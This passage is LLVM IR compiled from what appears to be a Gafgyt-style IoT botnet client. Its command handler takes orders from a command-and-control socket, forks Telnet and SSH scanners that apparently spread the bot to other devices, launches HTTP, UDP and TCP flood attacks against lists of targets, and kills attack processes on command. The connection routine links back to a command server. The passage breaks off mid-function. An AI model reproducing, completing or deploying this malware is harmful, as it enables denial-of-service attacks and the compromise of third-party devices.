define dso_local void @processCmd(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* noundef %29, i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i64 0, i64 0)) #11
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %35, label %32

32:                                               ; preds = %2
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %33, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i64 0, i64 0))
  br label %484

35:                                               ; preds = %2
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @strcmp(i8* noundef %38, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i64 0, i64 0)) #11
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %46, label %41

41:                                               ; preds = %35
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i8* @inet_ntoa(i32 %43) #12
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %42, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i64 0, i64 0), i8* noundef %44)
  br label %484

46:                                               ; preds = %35
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* noundef %49, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i64 0, i64 0)) #11
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %484, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* %3, align 4
  %54 = icmp ne i32 %53, 2
  br i1 %54, label %55, label %58

55:                                               ; preds = %52
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %56, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i64 0, i64 0))
  br label %484

58:                                               ; preds = %52
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @strcmp(i8* noundef %61, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #11
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %121, label %64

64:                                               ; preds = %58
  %65 = load i32, i32* @scanPid, align 4
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %64
  br label %484

68:                                               ; preds = %64
  %69 = load i32, i32* @mainCommSock, align 4
  %70 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %69, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i64 0, i64 0))
  %71 = load i32, i32* @scanPid, align 4
  %72 = call i32 @kill(i32 noundef %71, i32 noundef 9) #12
  store i32 0, i32* @scanPid, align 4
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @strcmp(i8* noundef %75, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i64 0, i64 0)) #11
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %96, label %78

78:                                               ; preds = %68
  %79 = load i32, i32* @scanPid, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %82

81:                                               ; preds = %78
  br label %484

82:                                               ; preds = %78
  %83 = call i32 @fork() #12
  store i32 %83, i32* %5, align 4
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %84, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0))
  %86 = load i32, i32* %5, align 4
  %87 = icmp ugt i32 %86, 0
  br i1 %87, label %88, label %90

88:                                               ; preds = %82
  %89 = load i32, i32* %5, align 4
  store i32 %89, i32* @scanPid, align 4
  br label %484

90:                                               ; preds = %82
  %91 = load i32, i32* %5, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %94

93:                                               ; preds = %90
  br label %484

94:                                               ; preds = %90
  br label %95

95:                                               ; preds = %94
  call void (i32, ...) bitcast (void ()* @TelnetScan to void (i32, ...)*)(i32 noundef 1)
  call void @_exit(i32 noundef 0) #14
  unreachable

96:                                               ; preds = %68
  %97 = load i8**, i8*** %4, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @strcmp(i8* noundef %99, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i64 0, i64 0)) #11
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %120, label %102

102:                                              ; preds = %96
  %103 = load i32, i32* @scanPid, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %106

105:                                              ; preds = %102
  br label %484

106:                                              ; preds = %102
  %107 = call i32 @fork() #12
  store i32 %107, i32* %6, align 4
  %108 = load i32, i32* @mainCommSock, align 4
  %109 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %108, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0))
  %110 = load i32, i32* %6, align 4
  %111 = icmp ugt i32 %110, 0
  br i1 %111, label %112, label %114

112:                                              ; preds = %106
  %113 = load i32, i32* %6, align 4
  store i32 %113, i32* @scanPid, align 4
  br label %484

114:                                              ; preds = %106
  %115 = load i32, i32* %6, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %118

117:                                              ; preds = %114
  br label %484

118:                                              ; preds = %114
  br label %119

119:                                              ; preds = %118
  call void (i32, ...) bitcast (void ()* @secureShellScan to void (i32, ...)*)(i32 noundef 1)
  call void @_exit(i32 noundef 0) #14
  unreachable

120:                                              ; preds = %96
  br label %121

121:                                              ; preds = %120, %58
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 0
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @strcmp(i8* noundef %124, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i64 0, i64 0)) #11
  %126 = icmp ne i32 %125, 0
  br i1 %126, label %175, label %127

127:                                              ; preds = %121
  %128 = load i32, i32* %3, align 4
  %129 = icmp slt i32 %128, 3
  br i1 %129, label %136, label %130

130:                                              ; preds = %127
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 2
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* noundef %133) #11
  %135 = icmp slt i32 %134, 1
  br i1 %135, label %136, label %137

136:                                              ; preds = %130, %127
  br label %484

137:                                              ; preds = %130
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 1
  %140 = load i8*, i8** %139, align 8
  store i8* %140, i8** %7, align 8
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 2
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* noundef %143) #11
  store i32 %144, i32* %8, align 4
  %145 = load i8*, i8** %7, align 8
  %146 = call i8* @strstr(i8* noundef %145, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #11
  %147 = icmp ne i8* %146, null
  br i1 %147, label %148, label %165

148:                                              ; preds = %137
  %149 = load i8*, i8** %7, align 8
  %150 = call i8* @strtok(i8* noundef %149, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %150, i8** %9, align 8
  br label %151

151:                                              ; preds = %162, %148
  %152 = load i8*, i8** %9, align 8
  %153 = icmp ne i8* %152, null
  br i1 %153, label %154, label %164

154:                                              ; preds = %151
  %155 = call i32 @listFork()
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %162, label %157

157:                                              ; preds = %154
  %158 = load i8*, i8** %7, align 8
  %159 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* noundef %158, i32 noundef %159)
  %160 = load i32, i32* @mainCommSock, align 4
  %161 = call i32 @close(i32 noundef %160)
  call void @_exit(i32 noundef 0) #14
  unreachable

162:                                              ; preds = %154
  %163 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %163, i8** %9, align 8
  br label %151, !llvm.loop !50

164:                                              ; preds = %151
  br label %174

165:                                              ; preds = %137
  %166 = call i32 @listFork()
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %168, label %169

168:                                              ; preds = %165
  br label %484

169:                                              ; preds = %165
  %170 = load i8*, i8** %7, align 8
  %171 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* noundef %170, i32 noundef %171)
  %172 = load i32, i32* @mainCommSock, align 4
  %173 = call i32 @close(i32 noundef %172)
  call void @_exit(i32 noundef 0) #14
  unreachable

174:                                              ; preds = %164
  br label %175

175:                                              ; preds = %174, %121
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 0
  %178 = load i8*, i8** %177, align 8
  %179 = call i32 @strcmp(i8* noundef %178, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i64 0, i64 0)) #11
  %180 = icmp ne i32 %179, 0
  br i1 %180, label %298, label %181

181:                                              ; preds = %175
  %182 = load i32, i32* %3, align 4
  %183 = icmp slt i32 %182, 6
  br i1 %183, label %229, label %184

184:                                              ; preds = %181
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 3
  %187 = load i8*, i8** %186, align 8
  %188 = call i32 @atoi(i8* noundef %187) #11
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %229, label %190

190:                                              ; preds = %184
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 2
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* noundef %193) #11
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %229, label %196

196:                                              ; preds = %190
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 4
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* noundef %199) #11
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %229, label %202

202:                                              ; preds = %196
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 5
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* noundef %205) #11
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %229, label %208

208:                                              ; preds = %202
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 5
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @atoi(i8* noundef %211) #11
  %213 = icmp sgt i32 %212, 65500
  br i1 %213, label %229, label %214

214:                                              ; preds = %208
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 4
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* noundef %217) #11
  %219 = icmp sgt i32 %218, 32
  br i1 %219, label %229, label %220

220:                                              ; preds = %214
  %221 = load i32, i32* %3, align 4
  %222 = icmp eq i32 %221, 7
  br i1 %222, label %223, label %230

223:                                              ; preds = %220
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 6
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* noundef %226) #11
  %228 = icmp slt i32 %227, 1
  br i1 %228, label %229, label %230

229:                                              ; preds = %223, %214, %208, %202, %196, %190, %184, %181
  br label %484

230:                                              ; preds = %223, %220
  %231 = load i8**, i8*** %4, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 1
  %233 = load i8*, i8** %232, align 8
  store i8* %233, i8** %10, align 8
  %234 = load i8**, i8*** %4, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 2
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 @atoi(i8* noundef %236) #11
  store i32 %237, i32* %11, align 4
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 3
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* noundef %240) #11
  store i32 %241, i32* %12, align 4
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 4
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* noundef %244) #11
  store i32 %245, i32* %13, align 4
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 5
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @atoi(i8* noundef %248) #11
  store i32 %249, i32* %14, align 4
  %250 = load i32, i32* %3, align 4
  %251 = icmp eq i32 %250, 7
  br i1 %251, label %252, label %257

252:                                              ; preds = %230
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 6
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @atoi(i8* noundef %255) #11
  br label %258

257:                                              ; preds = %230
  br label %258

258:                                              ; preds = %257, %252
  %259 = phi i32 [ %256, %252 ], [ 10, %257 ]
  store i32 %259, i32* %15, align 4
  %260 = load i8*, i8** %10, align 8
  %261 = call i8* @strstr(i8* noundef %260, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #11
  %262 = icmp ne i8* %261, null
  br i1 %262, label %263, label %284

263:                                              ; preds = %258
  %264 = load i8*, i8** %10, align 8
  %265 = call i8* @strtok(i8* noundef %264, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %265, i8** %16, align 8
  br label %266

266:                                              ; preds = %281, %263
  %267 = load i8*, i8** %16, align 8
  %268 = icmp ne i8* %267, null
  br i1 %268, label %269, label %283

269:                                              ; preds = %266
  %270 = call i32 @listFork()
  %271 = icmp ne i32 %270, 0
  br i1 %271, label %281, label %272

272:                                              ; preds = %269
  %273 = load i8*, i8** %16, align 8
  %274 = load i32, i32* %11, align 4
  %275 = load i32, i32* %12, align 4
  %276 = load i32, i32* %13, align 4
  %277 = load i32, i32* %14, align 4
  %278 = load i32, i32* %15, align 4
  call void @sendUDP(i8* noundef %273, i32 noundef %274, i32 noundef %275, i32 noundef %276, i32 noundef %277, i32 noundef %278)
  %279 = load i32, i32* @mainCommSock, align 4
  %280 = call i32 @close(i32 noundef %279)
  call void @_exit(i32 noundef 0) #14
  unreachable

281:                                              ; preds = %269
  %282 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %282, i8** %16, align 8
  br label %266, !llvm.loop !51

283:                                              ; preds = %266
  br label %297

284:                                              ; preds = %258
  %285 = call i32 @listFork()
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %287, label %288

287:                                              ; preds = %284
  br label %484

288:                                              ; preds = %284
  %289 = load i8*, i8** %10, align 8
  %290 = load i32, i32* %11, align 4
  %291 = load i32, i32* %12, align 4
  %292 = load i32, i32* %13, align 4
  %293 = load i32, i32* %14, align 4
  %294 = load i32, i32* %15, align 4
  call void @sendUDP(i8* noundef %289, i32 noundef %290, i32 noundef %291, i32 noundef %292, i32 noundef %293, i32 noundef %294)
  %295 = load i32, i32* @mainCommSock, align 4
  %296 = call i32 @close(i32 noundef %295)
  call void @_exit(i32 noundef 0) #14
  unreachable

297:                                              ; preds = %283
  br label %298

298:                                              ; preds = %297, %175
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 0
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @strcmp(i8* noundef %301, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #11
  %303 = icmp ne i32 %302, 0
  br i1 %303, label %429, label %304

304:                                              ; preds = %298
  %305 = load i32, i32* %3, align 4
  %306 = icmp slt i32 %305, 6
  br i1 %306, label %349, label %307

307:                                              ; preds = %304
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 3
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* noundef %310) #11
  %312 = icmp eq i32 %311, -1
  br i1 %312, label %349, label %313

313:                                              ; preds = %307
  %314 = load i8**, i8*** %4, align 8
  %315 = getelementptr inbounds i8*, i8** %314, i64 2
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 @atoi(i8* noundef %316) #11
  %318 = icmp eq i32 %317, -1
  br i1 %318, label %349, label %319

319:                                              ; preds = %313
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 4
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* noundef %322) #11
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %349, label %325

325:                                              ; preds = %319
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 4
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* noundef %328) #11
  %330 = icmp sgt i32 %329, 32
  br i1 %330, label %349, label %331

331:                                              ; preds = %325
  %332 = load i32, i32* %3, align 4
  %333 = icmp sgt i32 %332, 6
  br i1 %333, label %334, label %340

334:                                              ; preds = %331
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 6
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @atoi(i8* noundef %337) #11
  %339 = icmp slt i32 %338, 0
  br i1 %339, label %349, label %340

340:                                              ; preds = %334, %331
  %341 = load i32, i32* %3, align 4
  %342 = icmp eq i32 %341, 8
  br i1 %342, label %343, label %350

343:                                              ; preds = %340
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 7
  %346 = load i8*, i8** %345, align 8
  %347 = call i32 @atoi(i8* noundef %346) #11
  %348 = icmp slt i32 %347, 1
  br i1 %348, label %349, label %350

349:                                              ; preds = %343, %334, %325, %319, %313, %307, %304
  br label %484

350:                                              ; preds = %343, %340
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 1
  %353 = load i8*, i8** %352, align 8
  store i8* %353, i8** %17, align 8
  %354 = load i8**, i8*** %4, align 8
  %355 = getelementptr inbounds i8*, i8** %354, i64 2
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @atoi(i8* noundef %356) #11
  store i32 %357, i32* %18, align 4
  %358 = load i8**, i8*** %4, align 8
  %359 = getelementptr inbounds i8*, i8** %358, i64 3
  %360 = load i8*, i8** %359, align 8
  %361 = call i32 @atoi(i8* noundef %360) #11
  store i32 %361, i32* %19, align 4
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 4
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @atoi(i8* noundef %364) #11
  store i32 %365, i32* %20, align 4
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 5
  %368 = load i8*, i8** %367, align 8
  store i8* %368, i8** %21, align 8
  %369 = load i32, i32* %3, align 4
  %370 = icmp eq i32 %369, 8
  br i1 %370, label %371, label %376

371:                                              ; preds = %350
  %372 = load i8**, i8*** %4, align 8
  %373 = getelementptr inbounds i8*, i8** %372, i64 7
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @atoi(i8* noundef %374) #11
  br label %377

376:                                              ; preds = %350
  br label %377

377:                                              ; preds = %376, %371
  %378 = phi i32 [ %375, %371 ], [ 10, %376 ]
  store i32 %378, i32* %22, align 4
  %379 = load i32, i32* %3, align 4
  %380 = icmp sgt i32 %379, 6
  br i1 %380, label %381, label %386

381:                                              ; preds = %377
  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 6
  %384 = load i8*, i8** %383, align 8
  %385 = call i32 @atoi(i8* noundef %384) #11
  br label %387

386:                                              ; preds = %377
  br label %387

387:                                              ; preds = %386, %381
  %388 = phi i32 [ %385, %381 ], [ 0, %386 ]
  store i32 %388, i32* %23, align 4
  %389 = load i8*, i8** %17, align 8
  %390 = call i8* @strstr(i8* noundef %389, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #11
  %391 = icmp ne i8* %390, null
  br i1 %391, label %392, label %414

392:                                              ; preds = %387
  %393 = load i8*, i8** %17, align 8
  %394 = call i8* @strtok(i8* noundef %393, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %394, i8** %24, align 8
  br label %395

395:                                              ; preds = %411, %392
  %396 = load i8*, i8** %24, align 8
  %397 = icmp ne i8* %396, null
  br i1 %397, label %398, label %413

398:                                              ; preds = %395
  %399 = call i32 @listFork()
  %400 = icmp ne i32 %399, 0
  br i1 %400, label %411, label %401

401:                                              ; preds = %398
  %402 = load i8*, i8** %24, align 8
  %403 = load i32, i32* %18, align 4
  %404 = load i32, i32* %19, align 4
  %405 = load i32, i32* %20, align 4
  %406 = load i8*, i8** %21, align 8
  %407 = load i32, i32* %23, align 4
  %408 = load i32, i32* %22, align 4
  call void @sendTCP(i8* noundef %402, i32 noundef %403, i32 noundef %404, i32 noundef %405, i8* noundef %406, i32 noundef %407, i32 noundef %408)
  %409 = load i32, i32* @mainCommSock, align 4
  %410 = call i32 @close(i32 noundef %409)
  call void @_exit(i32 noundef 0) #14
  unreachable

411:                                              ; preds = %398
  %412 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %412, i8** %24, align 8
  br label %395, !llvm.loop !52

413:                                              ; preds = %395
  br label %428

414:                                              ; preds = %387
  %415 = call i32 @listFork()
  %416 = icmp ne i32 %415, 0
  br i1 %416, label %417, label %418

417:                                              ; preds = %414
  br label %484

418:                                              ; preds = %414
  %419 = load i8*, i8** %17, align 8
  %420 = load i32, i32* %18, align 4
  %421 = load i32, i32* %19, align 4
  %422 = load i32, i32* %20, align 4
  %423 = load i8*, i8** %21, align 8
  %424 = load i32, i32* %23, align 4
  %425 = load i32, i32* %22, align 4
  call void @sendTCP(i8* noundef %419, i32 noundef %420, i32 noundef %421, i32 noundef %422, i8* noundef %423, i32 noundef %424, i32 noundef %425)
  %426 = load i32, i32* @mainCommSock, align 4
  %427 = call i32 @close(i32 noundef %426)
  call void @_exit(i32 noundef 0) #14
  unreachable

428:                                              ; preds = %413
  br label %429

429:                                              ; preds = %428, %298
  %430 = load i8**, i8*** %4, align 8
  %431 = getelementptr inbounds i8*, i8** %430, i64 0
  %432 = load i8*, i8** %431, align 8
  %433 = call i32 @strcmp(i8* noundef %432, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #11
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %476, label %435

435:                                              ; preds = %429
  store i32 0, i32* %25, align 4
  store i64 0, i64* %26, align 8
  br label %436

436:                                              ; preds = %462, %435
  %437 = load i64, i64* %26, align 8
  %438 = load i64, i64* @numpids, align 8
  %439 = icmp ult i64 %437, %438
  br i1 %439, label %440, label %465

440:                                              ; preds = %436
  %441 = load i32*, i32** @pids, align 8
  %442 = load i64, i64* %26, align 8
  %443 = getelementptr inbounds i32, i32* %441, i64 %442
  %444 = load i32, i32* %443, align 4
  %445 = icmp ne i32 %444, 0
  br i1 %445, label %446, label %461

446:                                              ; preds = %440
  %447 = load i32*, i32** @pids, align 8
  %448 = load i64, i64* %26, align 8
  %449 = getelementptr inbounds i32, i32* %447, i64 %448
  %450 = load i32, i32* %449, align 4
  %451 = call i32 @getpid() #12
  %452 = icmp ne i32 %450, %451
  br i1 %452, label %453, label %461

453:                                              ; preds = %446
  %454 = load i32*, i32** @pids, align 8
  %455 = load i64, i64* %26, align 8
  %456 = getelementptr inbounds i32, i32* %454, i64 %455
  %457 = load i32, i32* %456, align 4
  %458 = call i32 @kill(i32 noundef %457, i32 noundef 9) #12
  %459 = load i32, i32* %25, align 4
  %460 = add nsw i32 %459, 1
  store i32 %460, i32* %25, align 4
  br label %461

461:                                              ; preds = %453, %446, %440
  br label %462

462:                                              ; preds = %461
  %463 = load i64, i64* %26, align 8
  %464 = add i64 %463, 1
  store i64 %464, i64* %26, align 8
  br label %436, !llvm.loop !53

465:                                              ; preds = %436
  %466 = load i32, i32* %25, align 4
  %467 = icmp sgt i32 %466, 0
  br i1 %467, label %468, label %472

468:                                              ; preds = %465
  %469 = load i32, i32* @mainCommSock, align 4
  %470 = load i32, i32* %25, align 4
  %471 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %469, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i64 0, i64 0), i32 noundef %470)
  br label %475

472:                                              ; preds = %465
  %473 = load i32, i32* @mainCommSock, align 4
  %474 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %473, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i64 0, i64 0))
  br label %475

475:                                              ; preds = %472, %468
  br label %476

476:                                              ; preds = %475, %429
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 0
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @strcmp(i8* noundef %479, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i64 0, i64 0)) #11
  %481 = icmp ne i32 %480, 0
  br i1 %481, label %483, label %482

482:                                              ; preds = %476
  call void @exit(i32 noundef 0) #16
  unreachable

483:                                              ; preds = %476
  br label %484

484:                                              ; preds = %483, %417, %349, %287, %229, %168, %136, %117, %112, %105, %93, %88, %81, %67, %55, %46, %41, %32
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #10

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 512, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* noundef %20, i8* noundef %24) #12
  store i32 46, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strchr(i8* noundef %26, i32 noundef 58) #11
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

29:                                               ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %31 = call i8* @strchr(i8* noundef %30, i32 noundef 58) #11
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* noundef %32) #11
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %35 = call i8* @strchr(i8* noundef %34, i32 noundef 58) #11
  store i8 0, i8* %35, align 1
  br label %36

36:                                               ; preds = %29, %19
